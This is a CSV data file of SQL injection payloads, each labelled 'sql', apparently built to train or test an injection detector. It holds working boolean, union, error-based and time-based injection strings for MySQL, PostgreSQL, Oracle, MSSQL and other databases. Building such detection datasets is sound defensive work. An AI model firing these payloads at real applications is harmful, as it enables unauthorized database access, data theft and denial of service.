Payloads,Types
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",sql
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'zfrs'  =  'zfrs",sql
1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,sql
end and    (    (     (  3673  =  3673,sql
"-4637"" where 8354  =  8354 or 1186  =  2714--",sql
end# ckxq,sql
1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',sql
"-9558""   )    )     )   union all select 2935,2935,2935,2935,2935--",sql
"1'  )   union all select null,null,null,null,null#",sql
"1%'   )    )    union all select null,null,null,null,null,null--",sql
"1""   )    )    as vtad where 3653  =  3653 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sql
1'||  (  select 'mobv' from dual where 6338  =  6338,sql
"-2964""   )    )    order by 1--",sql
"-9208%""   )    )    or 8571  =  8571--",sql
"1""   )    )    as drss where 2077  =  2077 and 7533  =  7533--",sql
 (  select   (  case when   (  6838  =  2866  )   then 6838 else 1/  (  select 0  )   end   )    ) ,sql
"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",sql
"-4168'  )   union all select 2618,2618#",sql
1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'odsl' like 'odsl,sql
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sql
"1 where 1062  =  1062 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sql
1  )   where 1096  =  1096,sql
"1  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  5220  =  5220",sql
"1%'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  '%'  =  '",sql
"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sql
"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",sql
"1 and make_set  (  8403  =  8403,8899  )  # zysq",sql
"1'   )    )     )   union all select null,null,null,null,null,null,null--",sql
-4428  )   or 3038  =  3038,sql
"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'odkr'  =  'odkr",sql
"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sql
"1"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""xwnw""  =  ""xwnw",sql
1%'  )   rlike   (  select   (  case when   (  1210  =  8664  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',sql
1'  )   where 1424  =  1424 and sleep  (  5  )  --,sql
"-6906' where 1839  =  1839 union all select 1839,1839,1839,1839,1839--",sql
1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sql
"1%' union all select null,null,null,null,null,null#",sql
"1"" where 4366  =  4366 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sql
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",sql
"1'+  (  select 'ovti' where 4243  =  4243 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",sql
1'||  (  select 'awic' where 5227  =  5227,sql
1'   )    )     )   or sleep  (  5  )  #,sql
"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sql
-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,sql
1' where 8482  =  8482 or sleep  (  5  )  #,sql
"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",sql
"1%""   )    )    and 8316  =  6410#",sql
"1'+  (  select zfpk where 9784  =  9784 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",sql
select   (  case when   (  3325  =  1767  )   then 3325 else 3325*  (  select 3325 from mysql.db  )   end  )  #,sql
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",sql
"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",sql
1'||  (  select 'ocmk' from dual where 3961  =  3961 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  ||',sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",sql
1   )    )     )   and 9575  =  1640--,sql
"-3963"" or 1224  =  5119",sql
" select sleep  (  5  )   and   (  ""%""  =  """,sql
"1""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sql
1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sql
"1"" where 2483  =  2483",sql
"-6442""   )    )     )   or 3038  =  3038",sql
1%' and   (  2439  =  2555  )  *2555 and '%'  =  ',sql
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""kbex"" like ""kbex",sql
"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sql
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",sql
"-7069  )   union all select 6638,6638,6638,6638,6638,6638--",sql
select   (  case when   (  8234  =  2498  )   then 8234 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,sql
1'  )   where 2120  =  2120,sql
"iif  (  1878  =  2513,1,1/0  )  ",sql
"1%""   )    )     )   union all select null,null,null,null#",sql
1  )   and sleep  (  5  )   and   (  4855  =  4855,sql
"-9392   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   2975  =  2975",sql
"-8200%""   )    )    union all select 7538,7538,7538#",sql
1 and   (  3437  =  2271  )  *2271,sql
"-5802'   )    )     )   union all select 6286,6286,6286,6286#",sql
"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",sql
"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",sql
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",sql
select   (  case when   (  3672  =  8360  )   then 3672 else 3672*  (  select 3672 from information_schema.character_sets  )   end  )  #,sql
"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",sql
1 where 1092  =  1092,sql
1'  )   where 9538  =  9538,sql
"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",sql
"-6854"" where 7794  =  7794 union all select 7794,7794--",sql
1'||  (  select 'mosp' where 6085  =  6085,sql
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",sql
-6215'  )   or   (  8459  =  8459  )  *4906,sql
"-8136'  )   union all select 1324,1324,1324,1324#",sql
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia,sql
-5336'  )   where 8691  =  8691 or 3608  =  1887--,sql
"1%""   )    )    union all select null,null,null,null,null#",sql
1'   )    )     )   and   (  5995  =  9618  )  *9618 and    (    (     (  'nagr' like 'nagr,sql
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sql
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",sql
-8095'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,sql
1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,sql
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'ekla'  =  'ekla",sql
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'zspf'  =  'zspf",sql
"-2222' in boolean mode  )   union all select 7649,7649,7649,7649,7649,7649,7649,7649--",sql
"-3525"" where 3522  =  3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",sql
"1'   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sql
-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,sql
"1   )    )    as nnpe where 9720  =  9720 union all select null,null,null,null,null,null,null,null,null#",sql
1 where 6523  =  6523 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sql
select case when 2930  =  7964 then 1 else null end--,sql
"1"" where 7631  =  7631 and 4733  =  3439",sql
1  )   as crsd where 5271  =  5271 waitfor delay '0:0:5'--,sql
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',sql
select case when 6555  =  7349 then 1 else null end--,sql
"1 where 4448  =  4448 union all select null,null,null,null,null#",sql
1'||  (  select 'hafu' where 6226  =  6226,sql
1'+  (  select mfcd where 6757  =  6757 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',sql
1'  )   where 2852  =  2852,sql
"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",sql
select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --,sql
1   )    )    as svhd where 9761  =  9761,sql
"-1868   )    )    union all select 1859,1859--",sql
"1   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sql
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",sql
"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",sql
1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',sql
"-3270"" where 2144  =  2144 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sql
-9700'  )   or 8811  =  7862,sql
"1  )   as wbcd where 9506  =  9506 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",sql
"1'  )   as bagi where 1281  =  1281   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",sql
1   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   7594  =  7594,sql
"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""rsru""  =  ""rsru",sql
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",sql
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sql
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'yvxg'  =  'yvxg,sql
1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',sql
"-3420 where 9681  =  9681 or make_set  (  2438  =  1977,1977  )  --",sql
1'   )    )    as vrwr where 3830  =  3830,sql
"1""  )   where 1833  =  1833",sql
"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",sql
"1%""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""%""  =  """,sql
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",sql
"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",sql
"1  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sql
"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",sql
"1'+  (  select 'ewlk' where 1078  =  1078 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sql
"1%"" union all select null#",sql
"1""   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   ""qqky"" like ""qqky",sql
-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,sql
